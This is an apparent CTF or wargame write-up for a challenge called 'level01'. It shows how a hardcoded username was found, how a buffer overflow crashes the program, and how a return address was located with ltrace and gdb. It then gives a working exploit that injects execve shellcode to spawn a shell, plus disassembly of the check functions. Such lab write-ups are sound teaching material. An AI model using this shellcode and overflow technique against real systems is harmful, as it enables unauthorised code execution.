# level01

## find username

```
Username: dat_wil
```

## buffer overflow
```
python -c 'print "dat_wil\n" + "x"*80 + "abcd"' > /tmp/01
/tmp/01 > ./level01
```
this command makes segfault at `64636261`

## find address 
with `ltrace ./level01`, 
```
fgets(ls
"ls\n", 100, 0xf7fcfac0) = 0xffffd6ac
```
-> `\xff\xff\xd6\xac`

**mystery** : when we check in gdb, it's `\xff\xff\xd6\x7c` but with this, we get segfault...

## exploit
```
python -c '''
user = "dat_wil\n"
shellcode = "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
padding = "x"*(80-len(shellcode))
address = "\xff\xff\xd6\x7c"[::-1]
print user + shellcode + padding + address
''' > /tmp/01

cat /tmp/01 - | ./level01
```


## asm 
```
0x8048467 <verify_user_name+3>  push   %edi
0x8048468 <verify_user_name+4>  push   %esi
0x8048469 <verify_user_name+5>  sub    $0x10,%esp
0x804846c <verify_user_name+8>  movl   $0x8048690,(%esp)
0x8048473 <verify_user_name+15> call   0x8048380 <puts@plt>
0x8048478 <verify_user_name+20> mov    $0x804a040,%edx
0x804847d <verify_user_name+25> mov    $0x80486a8,%eax
0x8048482 <verify_user_name+30> mov    $0x7,%ecx
0x8048487 <verify_user_name+35> mov    %edx,%esi
0x8048489 <verify_user_name+37> mov    %eax,%edi
0x804848b <verify_user_name+39> repz cmpsb %es:(%edi),%ds:(%esi)
0x804848d <verify_user_name+41> seta   %dl
0x8048490 <verify_user_name+44> setb   %al
0x8048493 <verify_user_name+47> mov    %edx,%ecx
0x8048495 <verify_user_name+49> sub    %al,%cl
0x8048497 <verify_user_name+51> mov    %ecx,%eax
0x8048499 <verify_user_name+53> movsbl %al,%eax
0x804849c <verify_user_name+56> add    $0x10,%esp
0x804849f <verify_user_name+59> pop    %esi
0x80484a0 <verify_user_name+60> pop    %edi
0x80484a1 <verify_user_name+61> pop    %ebp
0x80484a2 <verify_user_name+62> ret
```
```
0x80484a3 <verify_user_pass>    push   %ebp
0x80484a4 <verify_user_pass+1>  mov    %esp,%ebp
0x80484a6 <verify_user_pass+3>  push   %edi
0x80484a7 <verify_user_pass+4>  push   %esi
0x80484a8 <verify_user_pass+5>  mov    0x8(%ebp),%eax
0x80484ab <verify_user_pass+8>  mov    %eax,%edx
0x80484ad <verify_user_pass+10> mov    $0x80486b0,%eax
0x80484b2 <verify_user_pass+15> mov    $0x5,%ecx
0x80484b7 <verify_user_pass+20> mov    %edx,%esi
0x80484b9 <verify_user_pass+22> mov    %eax,%edi
0x80484bb <verify_user_pass+24> repz cmpsb %es:(%edi),%ds:(%esi)
0x80484bd <verify_user_pass+26> seta   %dl
0x80484c0 <verify_user_pass+29> setb   %al
0x80484c3 <verify_user_pass+32> mov    %edx,%ecx
0x80484c5 <verify_user_pass+34> sub    %al,%cl
0x80484c7 <verify_user_pass+36> mov    %ecx,%eax
0x80484c9 <verify_user_pass+38> movsbl %al,%eax
0x80484cc <verify_user_pass+41> pop    %esi
0x80484cd <verify_user_pass+42> pop    %edi
0x80484ce <verify_user_pass+43> pop    %ebp
0x80484cf <verify_user_pass+44> ret
